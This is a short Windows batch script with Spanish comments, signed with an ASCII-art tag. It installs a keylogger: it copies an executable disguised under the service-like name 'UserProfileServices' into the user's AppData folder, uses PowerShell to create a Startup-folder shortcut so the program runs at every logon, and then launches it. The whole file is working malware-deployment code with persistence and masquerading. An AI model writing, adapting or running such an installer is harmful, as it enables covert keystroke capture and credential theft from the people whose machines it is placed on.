@echo off

:: Variables
set currentDirectory=%~dp0
set nameScript=UserProfileServices
set pathStarup="%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"

:: Copiar KeyLogger
copy "%currentDirectory%%nameScript%.exe" "%appdata%"

:: Crear Acceso Directo en Menu Inicio de Windows
powershell "$s=(New-Object -ComObject WScript.Shell).CreateShortcut(\"%pathStarup%\%nameScript%.lnk\");$s.TargetPath=\"%appdata%\%nameScript%.exe\";$s.Save()"

:: Iniciar Acceso Directo
start "" %pathStarup%\%nameScript%.lnk

::  \____/\
::  /\``/\
:: -byRyanAg...